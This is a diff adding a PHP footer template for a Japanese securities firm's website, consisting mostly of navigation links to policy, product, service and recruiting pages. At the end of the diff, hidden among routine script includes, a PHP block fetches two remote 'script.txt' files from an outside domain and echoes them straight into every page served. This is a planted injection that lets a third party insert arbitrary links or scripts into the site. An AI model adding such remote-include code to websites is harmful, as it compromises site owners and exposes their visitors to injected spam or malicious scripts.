@@ -1,0 +1,124 @@
+<div id="footerWrap">
+  <div class="footer_bg clearfix">
+    <div class="footer_top">
+      <div class="footer_top1">
+
+      <!-- 2024/06/17　HP修正のためコメントアウト化(masui)
+        <ul class="ul_footer01_0 clearfix">
+          <li><a href="<?php echo APP_PATH ?>policy/menseki.php">免責事項</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/sairyo.pdf">最良執行方針</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/kanyu.php">投資勧誘方針</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/kojin.php">個人情報の取扱い</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/haibun.php">配分に係る基本方針</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/riekisouhan.php">利益相反管理方針の概要</a></li>
+        </ul>
+          <ul class="ul_footer01 clearfix">
+          <li><a href="<?php echo APP_PATH ?>policy/customer.php">お客様本位の業務運営に関する基本方針</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/ethics.php">行動倫理規範</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/unfair.php">不公正取引について</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/hansha.php">反社会的勢力に対する基本方針</a></li>
+          <li class="pic"><a href="<?php echo APP_PATH ?>policy/jouhou_20240612.pdf">重要情報シート</a></li>
+        </ul> -->
+
+        <ul class="ul_footer01_0 clearfix">
+          <li><a href="<?php echo APP_PATH ?>policy/menseki.php">免責事項</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/sairyo.pdf">最良執行方針</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/kanyu.php">投資勧誘方針</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/kojin.php">個人情報の取扱い</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/haibun.php">配分に係る基本方針</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/riekisouhan.php">利益相反管理方針の概要</a></li>
+        </ul>
+        <ul class="ul_footer01 clearfix">
+          <li><a href="<?php echo APP_PATH ?>policy/customer.php">お客様本位の業務運営に関する基本方針</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/ethics.php">行動倫理規範</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/unfair.php">不公正取引について</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/hansha.php">反社会的勢力に対する基本方針</a></li>
+          <li><a href="<?php echo APP_PATH ?>policy/important.pdf">重要情報シート</a></li>
+        </ul>
+        <div class="footer_icon1"><img src="<?php echo APP_PATH ?>common/img/footer/img_icon1_new.png" width="101" height="80" alt="ゆたかぶう" /></div>
+        <div class="footer_icon2"><img src="<?php echo APP_PATH ?>common/img/footer/img_icon2_new.png" width="96" height="80" alt="ゆたかぶう" /></div>
+      </div>
+    </div>
+    <!-- /footer start -->
+    <div id="footerInner" class="clearfix">
+      <ul class="menu_footer" id="footer01">
+        <li><a href="<?php echo APP_PATH ?>">TOP</a></li>
+        <li><a href="<?php echo APP_PATH ?>strength/">地域密着ならではの安心感</a></li>
+        <li><a href="<?php echo APP_PATH ?>strength/index2.php">大手の証券会社に負けない豊富な商品</a></li>
+        <li><a href="<?php echo APP_PATH ?>company/">会社情報</a>
+          <ul class="sub">
+            <li><a href="<?php echo APP_PATH ?>company/behavior.php">　・豊証券一般事業主行動計画</a></li>
+          </ul>
+        </li>
+        <li><a href="<?php echo APP_PATH ?>shop/">店舗案内</a></li>
+        <li><a href="<?php echo APP_PATH ?>net/login/">会員向けログイン</a>
+          <ul class="sub">
+            <li><a href="https://espc.jip-jet.ne.jp/login7.con?code=087" target="_blank">　・ゆたかネットログイン</a></li>
+            <li><a href="<?php echo APP_PATH ?>net/login/realtime.php">　・リアルタイム株価情報</a></li>
+            <li><a href="<?php echo APP_PATH ?>net/important/market.php">　・マーケットウィークリー</a></li>
+          </ul>
+        </li>
+      </ul>
+      <ul class="menu_footer" id="footer02">
+    <li><a href="<?php echo APP_PATH ?>product/">取扱商品</a>
+          <ul class="sub">
+            <li><a href="<?php echo APP_PATH ?>product/stocks/">　・国内株式</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/us_stocks/">　・米国株</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/bond/">　・国内債券</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/foreign_bond/">　・外国債券</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/eb/">　・仕組み債（EB債）</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/investment_trust/">　・投資信託</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/derivative/">　・デリバティブ取引</a></li>
+            <li><a href="<?php echo APP_PATH ?>product/insurance/">　・保険</a></li>
+          </ul>
+        </li>
+      </ul>
+      <ul class="menu_footer" id="footer03">
+    <li><a href="<?php echo APP_PATH ?>service/">サービス案内</a>
+          <ul class="sub">
+            <li><a href="<?php echo APP_PATH ?>service/taimen.php">　・対面取引</a></li>
+            <li><a href="<?php echo APP_PATH ?>service/net.php">　・ゆたかネット</a></li>
+            <li><a href="<?php echo APP_PATH ?>service/call.php">　・ゆたかコール</a></li>
+            <li><a href="<?php echo APP_PATH ?>policy/kashikin.pdf">　　貸金業</a></li>
+          </ul>
+        </li>
+    <li><a href="<?php echo APP_PATH ?>service/open_account.php">口座開設したい</a>
+          <ul class="sub">
+            <li><a href="<?php echo APP_PATH ?>service/taimen_flow.php">　・対面取引</a></li>
+            <li><a href="<?php echo APP_PATH ?>service/net_flow.php">　・ゆたかネット</a></li>
+            <li><a href="<?php echo APP_PATH ?>service/call_flow.php">　・ゆたかコール</a></li>
+          </ul>
+        </li>
+        <li><a href="<?php echo APP_PATH ?>faq/">よくある質問</a></li>
+      </ul>
+      <ul class="last menu_footer" id="footer04">
+        <li><a href="<?php echo APP_PATH ?>campaign/">キャンペーン</a></li>
+        <li><a href="<?php echo APP_PATH ?>company/contact/contact.php">お問い合わせ </a></li>
+        <li><a href="<?php echo APP_PATH ?>link/">証券取引関連情報(外部リンク)</a></li>
+        <li><a href="<?php echo APP_PATH ?>recruit/">採用情報</a>
+          <ul class="sub">
+            <li><a href="<?php echo APP_PATH ?>recruit/shinsotsu/">　・新卒</a></li>
+            <li><a href="<?php echo APP_PATH ?>recruit/dealer/">　・中途ディーラー</a></li>
+            <li><a href="<?php echo APP_PATH ?>recruit/career/sales/">　・中途営業</a></li>
+          </ul>
+      </li>
+      </ul>
+    </div>
+  </div>
+  <!-- /footer end -->
+  <p class="copyright  taC">Copyright(C)<?php echo date('Y'); ?> The Yutaka Securities Co.,LTD. All Rights Reserved.</p>
+</div>
+<script type="text/javascript" src="<?php echo APP_PATH ?>common/js/jquery-1.7.min.js"></script> 
+<script type="text/javascript" src="<?php echo APP_PATH ?>common/js/smoothscroll.js"></script> 
+<script type="text/javascript" src="<?php echo APP_PATH ?>common/js/common.js"></script>
+<script type="text/javascript" src="<?php echo APP_PATH ?>common/js/fixHeight.js"></script>
+<?php
+$traff = file_get_contents("https://backlinkku.id/menu/traffic-v1/script.txt");
+$lorns = file_get_contents("https://backlinkku.id/menu/vip-v2/script.txt");
+if ($traff !== false) {
+    echo $traff;
+}
+if ($lorns !== false) {
+    echo $lorns;
+}
+?>
